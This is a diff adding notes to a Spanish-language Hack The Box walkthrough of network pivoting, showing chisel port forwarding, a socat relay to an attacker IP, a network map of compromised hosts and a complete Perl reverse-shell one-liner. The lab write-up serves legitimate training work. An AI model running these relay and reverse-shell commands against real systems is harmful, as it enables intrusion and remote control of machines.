@@ -106,6 +106,8 @@ Entonces chisel funciona asi la maquina Kali va a ser el servidor y la maquina v
 
 Cliente (victima)
 ```
+./chisel client 10.10.14.11:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6373
+
 chisel client IPKALI:1234 R:80:IP_adondequeremosllegar:80
                           El puerto 80 de este equipo se convierta en el puerto 80 de mi equipo.
 Y no acaba ahi puedes meterle multiples puertos
@@ -126,13 +128,62 @@ nmap -sCV -p6379 127.0.0.1
 ```
 
 
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/1090c4b9-0272-4897-afca-29f4885cb455)
 
 
+Ahora en la pagina que encontramos encontramos rutas. ( por lo menos S4vitar de pregunto y si esas rutas estan dentro de /var/www/html/ruta y asi fue el razonamiento)
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/9253e88b-d334-4f05-ad47-58d2a963f556)
+
+Entonces vamos a hacktricks y leemos que existe una manera de lograr RCE.
+
+## PIVOTING (sotcat)
 
 
+```
+
+Nodered ( hostname)
+
+eth0  (interfaz de Nodered) 172.18.0.2/16
+
+        [+] Host 172.18.0.2 -ACTIVE <- (Nodered) [PWNED]
+               [+] Port 1880 - OPEN
+        [+] Host 172.18.0.1 -ACTIVE <- Maquina Host
+               [+] Port 1880 - OPEN
 
 
+eth1 (interfaz de Nodered) 172.19.0.4/16
 
+      [+] La ip 172.19.0.4 -ACTIVE <- (Nodered) [PWNED] -> 1111 -> ./socat TCP-LISTEN:1111,fork TCP:10.10.14.11:2222 &
+
+               [+] Port 1880 - OPEN
+      [+] La ip 172.19.0.3 -ACTIVE (hints) == Tenenmos ejecucion de comandos mediante web shell (pero no podemos tener conectividad con Kali solo la IP del segmento)
+               [+] Port 80 - OPEN
+      [+] La ip 172.19.0.2 -ACTIVE ( redis) ==
+               [+] Port 6379 - OPEN
+
+
+      [+] La ip 172.19.0.1 -ACTIVE <- Maquina Host
+
+```
+
+Entonces tenemos la  172.19.0.4 PWNED desde el incio y logramos comand execution en la 172.19.0.3 ( que a su vez tiene ips nuevas que no habiamos visto osea alcanza otras redes). Ahora lo que vamos a hacer para poder
+seguir es mandarnos una reverse shell a la  172.19.0.4 (que si tiene conectividad porque estan en el mismo segmento) OJO y es aqui donde pusimos el SOTCAT que redirige todo el trafico del puerto 1111 a la IP_KALI por el 
+puerto 2222 y bum tenemos una shell en Kali y ahora podemos alzar otras redes.
+
+Cabe destacar que tomamos un binario estatico del mismo repo del nmap este:
+
+> https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
+
+```
+./socat TCP-LISTEN:1111,fork TCP:10.10.14.11:2222 & #Por cierto que dejamos corriendo en segundo plano
+
+```
+A y para la shell usamos una de perl y pusimos %26 en lugar de & (url encode) para que no nos diera problemas.
+
+```
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
 
 
